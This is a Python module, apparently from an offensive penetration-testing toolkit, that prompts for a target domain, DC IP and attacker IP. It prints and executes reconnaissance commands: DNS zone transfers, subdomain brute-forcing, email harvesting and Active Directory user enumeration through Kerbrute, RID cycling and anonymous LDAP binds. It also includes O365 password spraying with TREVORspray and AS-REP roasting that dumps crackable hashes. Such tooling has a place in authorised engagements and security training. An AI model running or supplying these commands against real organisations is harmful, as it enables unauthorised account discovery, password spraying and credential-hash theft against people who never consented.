"""
Module: Recon & OSINT
Techniques: DNS recon, WHOIS, email harvesting, certificate transparency,
            ASN lookup, subdomain enumeration, user enumeration (Kerbrute/o365)
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("RECON & OSINT", "Pre-engagement intelligence gathering")
    dom      = input_or_session("domain",      "Target domain (e.g. corp.local / corp.com)")
    dc       = input_or_session("dc_ip",       "DC IP (optional for internal recon)")
    attacker = input_or_session("attacker_ip", "Attacker IP")

    print(f"""
  {C}── DNS RECON ────────────────────────────────────────────────────{RST}
  [1]  DNS Zone Transfer
  [2]  DNS Subdomain Brute-Force
  [3]  DNS Records Dump (A/MX/NS/SRV/TXT)
  {C}── OSINT ────────────────────────────────────────────────────────{RST}
  [4]  WHOIS Lookup
  [5]  ASN / IP Range Lookup
  [6]  Certificate Transparency (crt.sh)
  [7]  Email Harvesting (theHarvester)
  {C}── USER ENUMERATION ─────────────────────────────────────────────{RST}
  [8]  AD Username Enumeration (Kerbrute)
  [9]  O365 / Azure User Enumeration
  [10] RID Cycling (null session)
  [11] LDAP Anonymous Bind Enum
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        print(f"""
  {C}DNS Zone Transfer:{RST}

  {Y}dig (Linux):{RST}
  dig axfr {dom} @{dc}
  dig axfr {dom} @$(dig +short NS {dom} | head -1)

  {Y}nmap:{RST}
  nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain={dom} -p 53 {dc}

  {Y}fierce:{RST}
  fierce --domain {dom} --dns-servers {dc}
""")
        run_cmd(f"dig axfr {dom} @{dc}")

    elif c == "2":
        wordlist = prompt("Wordlist path (default=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt)") or \
                   "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
        print(f"""
  {C}Subdomain Brute-Force:{RST}

  {Y}dnsx:{RST}
  dnsx -d {dom} -w {wordlist} -o /tmp/subdomains_{dom}.txt

  {Y}gobuster dns:{RST}
  gobuster dns -d {dom} -w {wordlist} -r {dc} -o /tmp/subs_{dom}.txt

  {Y}amass:{RST}
  amass enum -passive -d {dom} -o /tmp/amass_{dom}.txt
  amass enum -active -d {dom} -r {dc} -o /tmp/amass_active_{dom}.txt

  {Y}dnsrecon:{RST}
  dnsrecon -d {dom} -D {wordlist} -t brt -n {dc}
""")
        run_cmd(f"dnsrecon -d {dom} -D {wordlist} -t brt -n {dc}")

    elif c == "3":
        print(f"""
  {C}DNS Records Dump:{RST}

  {Y}All record types:{RST}
  for type in A AAAA MX NS SOA SRV TXT CNAME; do
    echo "=== $type ==="
    dig +short $type {dom} @{dc}
  done

  {Y}SRV records (find DC, LDAP, Kerberos):{RST}
  dig SRV _kerberos._tcp.{dom} @{dc}
  dig SRV _ldap._tcp.{dom} @{dc}
  dig SRV _ldap._tcp.dc._msdcs.{dom} @{dc}
  dig SRV _kpasswd._tcp.{dom} @{dc}
  dig SRV _gc._tcp.{dom} @{dc}

  {Y}nmap DNS scripts:{RST}
  nmap -p 53 --script dns-service-discovery {dc}
  nmap -p 53 --script dns-brute --script-args dns-brute.domain={dom} {dc}
""")
        run_cmd(f"dig any {dom} @{dc}")

    elif c == "4":
        print(f"""
  {C}WHOIS Lookup:{RST}

  whois {dom}
  whois $(dig +short {dom})

  {Y}Online alternatives:{RST}
  curl -s https://whois.arin.net/rest/ip/$(dig +short {dom}) | python3 -m json.tool
""")
        run_cmd(f"whois {dom}")

    elif c == "5":
        ip = prompt("Target IP or domain for ASN lookup")
        print(f"""
  {C}ASN / IP Range Lookup:{RST}

  {Y}whois ASN:{RST}
  whois -h whois.cymru.com " -v {ip}"

  {Y}amass intel:{RST}
  amass intel -org "{dom}" -whois

  {Y}bgpview (curl):{RST}
  curl -s https://api.bgpview.io/search?query_term={dom} | python3 -m json.tool

  {Y}nmap IP range scan once ASN identified:{RST}
  nmap -sn <ASN_CIDR> -oG /tmp/hosts_alive.txt
  grep Up /tmp/hosts_alive.txt | awk '{{print $2}}' > /tmp/alive.txt
""")

    elif c == "6":
        print(f"""
  {C}Certificate Transparency — find subdomains / internal hosts:{RST}

  {Y}crt.sh (curl):{RST}
  curl -s "https://crt.sh/?q=%.{dom}&output=json" | \\
    python3 -c "import sys,json; [print(e['name_value']) for e in json.load(sys.stdin)]" | \\
    sort -u | tee /tmp/crtsh_{dom}.txt

  {Y}certspotter:{RST}
  curl -s "https://api.certspotter.com/v1/issuances?domain={dom}&include_subdomains=true&expand=dns_names" | \\
    python3 -m json.tool

  {Y}Filter internal hostnames:{RST}
  grep -v "\\*" /tmp/crtsh_{dom}.txt | sort -u
""")
        run_cmd(
            f'curl -s "https://crt.sh/?q=%.{dom}&output=json" | '
            f'python3 -c "import sys,json; [print(e[\'name_value\']) for e in json.load(sys.stdin)]" | sort -u'
        )

    elif c == "7":
        print(f"""
  {C}Email Harvesting:{RST}

  {Y}theHarvester:{RST}
  theHarvester -d {dom} -b all -l 500 -f /tmp/harvest_{dom}

  {Y}Sources individually:{RST}
  theHarvester -d {dom} -b google -l 200
  theHarvester -d {dom} -b bing -l 200
  theHarvester -d {dom} -b linkedin -l 200
  theHarvester -d {dom} -b hunter -l 200

  {Y}Extract unique emails:{RST}
  grep "@{dom}" /tmp/harvest_{dom}.xml | sort -u > /tmp/emails_{dom}.txt
  cat /tmp/emails_{dom}.txt

  {Y}Convert emails to usernames (common AD formats):{RST}
  # john.doe@corp.com → john.doe / jdoe / johnd / john_doe
  awk -F'@' '{{print $1}}' /tmp/emails_{dom}.txt > /tmp/usernames_{dom}.txt
""")
        run_cmd(f"theHarvester -d {dom} -b bing,google -l 200 -f /tmp/harvest_{dom}")

    elif c == "8":
        wordlist = prompt("Username wordlist (default=/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt)") or \
                   "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
        print(f"""
  {C}AD Username Enumeration via Kerbrute:{RST}

  {Y}Enumerate valid AD usernames (no password needed):{RST}
  kerbrute userenum \\
    --dc {dc} --domain {dom} \\
    {wordlist} \\
    -o /tmp/valid_users_{dom}.txt \\
    -t 50

  {Y}With custom email-derived list:{RST}
  kerbrute userenum \\
    --dc {dc} --domain {dom} \\
    /tmp/usernames_{dom}.txt \\
    -o /tmp/valid_users_{dom}.txt

  {Y}AS-REP Roast valid users immediately:{RST}
  impacket-GetNPUsers {dom}/ \\
    -usersfile /tmp/valid_users_{dom}.txt \\
    -dc-ip {dc} -format hashcat \\
    -outputfile /tmp/asrep_hashes.txt
""")
        run_cmd(
            f"kerbrute userenum --dc {dc} --domain {dom} "
            f"{wordlist} -o /tmp/valid_users_{dom}.txt -t 50"
        )

    elif c == "9":
        print(f"""
  {C}O365 / Azure AD User Enumeration:{RST}

  {Y}o365enum (timing-based — no lockout):{RST}
  python3 o365enum.py -u /tmp/usernames_{dom}.txt -d {dom}

  {Y}TREVORspray (smart lockout-aware spray):{RST}
  python3 trevorspray.py -u /tmp/usernames_{dom}.txt \\
    -d {dom} --spray

  {Y}Check if domain is federated (ADFS / PTA / PHS):{RST}
  curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=test@{dom}&xml=1" | \\
    python3 -c "import sys; from xml.etree import ElementTree as ET; \\
    t = ET.parse(sys.stdin); [print(e.tag, e.text) for e in t.iter()]"

  {Y}AADInternals — tenant recon:{RST}
  Import-Module AADInternals
  Invoke-AADIntReconAsOutsider -DomainName {dom} | Format-Table
  Get-AADIntTenantDomains -Domain {dom}
""")

    elif c == "10":
        print(f"""
  {C}RID Cycling — enumerate users via null SMB session:{RST}

  {Y}impacket-lookupsid (null session):{RST}
  impacket-lookupsid {dom}/:{"{none}"}@{dc}

  {Y}impacket-lookupsid (with creds):{RST}
  impacket-lookupsid {dom}/guest@{dc} -no-pass

  {Y}nxc SMB RID brute:{RST}
  nxc smb {dc} -u '' -p '' --rid-brute 10000

  {Y}enum4linux-ng:{RST}
  enum4linux-ng -A {dc} -oA /tmp/enum4linux_{dc}
""")
        run_cmd(f"{imp('lookupsid.py')} {dom}/guest@{dc} -no-pass")

    elif c == "11":
        print(f"""
  {C}LDAP Anonymous Bind — unauthenticated enumeration:{RST}

  {Y}Test anonymous bind:{RST}
  ldapsearch -x -H ldap://{dc} -b '' -s base namingContexts

  {Y}Enumerate base DN:{RST}
  ldapsearch -x -H ldap://{dc} \\
    -b 'DC={dom.replace(".", ",DC=")}' \\
    '(objectClass=*)' | head -100

  {Y}Get all users anonymously (if allowed):{RST}
  ldapsearch -x -H ldap://{dc} \\
    -b 'DC={dom.replace(".", ",DC=")}' \\
    '(objectClass=user)' sAMAccountName

  {Y}nxc LDAP anonymous:{RST}
  nxc ldap {dc} -u '' -p '' --users
  nxc ldap {dc} -u '' -p '' --groups
  nxc ldap {dc} -u '' -p '' --pass-pol
""")
        run_cmd(f"ldapsearch -x -H ldap://{dc} -b '' -s base namingContexts")

    pause()
